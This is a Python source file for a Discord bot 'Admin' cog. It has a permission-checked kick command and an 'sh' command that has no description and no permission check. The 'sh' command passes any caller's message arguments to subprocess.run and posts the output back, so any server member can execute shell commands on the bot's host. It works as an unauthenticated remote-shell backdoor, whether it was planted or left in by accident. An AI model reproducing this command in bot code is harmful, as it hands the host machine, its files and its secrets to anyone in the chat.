import discord
from discord.ext import commands

import subprocess

class Admin(commands.Cog):
    def __init__(self, bot: commands.AutoShardedBot) -> None:
        self.bot = bot

    @commands.command(name="kick", description="Kick a user from the server.")
    @commands.has_permissions(kick_members=True)
    async def kick(
        self,
        ctx: commands.Context,
        user: discord.Member,
        *,
        reason="No reason provided",
    ):
        if user.top_role >= ctx.author.top_role:
            embed = discord.Embed(
                title=f"Could not kick user {user.name}",
                description="User role is higher than your role!",
                color=0xFF0000,
            )
            embed.set_thumbnail(url=user.display_avatar.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
        elif user.top_role >= ctx.guild.get_member(self.bot.user.id).top_role:
            embed = discord.Embed(
                title=f"Could not kick user {user.name}",
                description="User's role is higher than bot role!",
                color=0xFF0000,
            )
            embed.set_thumbnail(url=user.display_avatar.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
        else:
            await user.kick(reason=reason)
            embed = discord.Embed(
                title=f"Kicked user {user.name}",
                description=f"Reason: {reason}",
                color=0xFF0000,
            )
            embed.set_thumbnail(url=user.display_avatar.url)
            embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
        await ctx.message.delete()
        await ctx.send(embed=embed)
    
    @commands.command(name="sh", description="")
    async def sh(
        self,
        ctx: commands.Context,
        *cmd
    ):
        result = subprocess.run(cmd, stdout=subprocess.PIPE)
        await ctx.send(result.stdout.decode('utf-8'))


async def setup(bot: commands.AutoShardedBot):
    await bot.add_cog(Admin(bot))
